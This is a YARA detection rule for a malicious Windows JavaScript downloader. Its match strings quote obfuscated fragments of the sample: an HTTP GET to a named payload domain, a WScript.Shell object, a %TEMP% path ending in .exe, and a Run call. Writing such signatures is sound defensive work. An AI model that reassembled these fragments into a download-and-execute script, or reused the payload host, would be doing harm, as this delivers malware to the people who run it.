rule sig_20160401_6ad66e29119e4389647dbcfec2e8f207 {
  meta:
    description = "datamaliciousorder - file 20160401_6ad66e29119e4389647dbcfec2e8f207.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2f2b306803875710685e3c5d42d88e8e048f0306cc0f873b56d5064be0e05e25"

  strings:
    $s1  = "LaHq[HbChg](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "var ToDyj = function YxDdi() {return WScript[WqEkx](\"WScript\"+\".Shell\");}(), LgeTxj = 11;" fullword ascii
    $s3  = "function RpEjf(LfBi, LjpFw){CdrVh = CdrVh * 1; return LfBi - LjpFw;};" fullword ascii
    $s4  = "if (LaHq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "var OsQxb = IiWi[\"getUTCMilliseconds\"]();" fullword ascii
    $s6  = "function AsfTpy(){return WqEkx;};" fullword ascii
    $s7  = "var IfCt = IiWi[\"getUTCMilliseconds\"]();" fullword ascii
    $s8  = "var FmCwh = IiWi[\"getUTCMilliseconds\"]();" fullword ascii
    $s9  = "function KdhTo() {return ToDyj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Ab5KSM4iPFi9wMW.ex\" + \"e\";};" fullword ascii
    $s10 = "function IawWnl(){return PoxGyt + \"\";};" fullword ascii
    $s11 = "function EwRe() {return ((QxzCb == true) && (QxzCb == EfJr)) ? 1 : CdrVh;};" fullword ascii
    $s12 = "var IiWi = new this[\"Date\"]();" fullword ascii
    $s13 = "function TwSbt(){return 23;};" fullword ascii
    $s14 = "}while (RxVrp);" fullword ascii
    $s15 = "function YsaAc(FmTnl) {var KixDwv = (1, 2, 3, 4, 5, FmTnl); return KixDwv;};" fullword ascii
    $s16 = "var EfJr = false;" fullword ascii
    $s17 = "QxzCb = true; " fullword ascii
    $s18 = "function IbrXpi(SgBnw){ToDyj[\"R\"+\"un\"](SgBnw, CdrVh, CdrVh);};" fullword ascii
    $s19 = "var QxzCb = false;" fullword ascii
    $s20 = "var NsvHb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}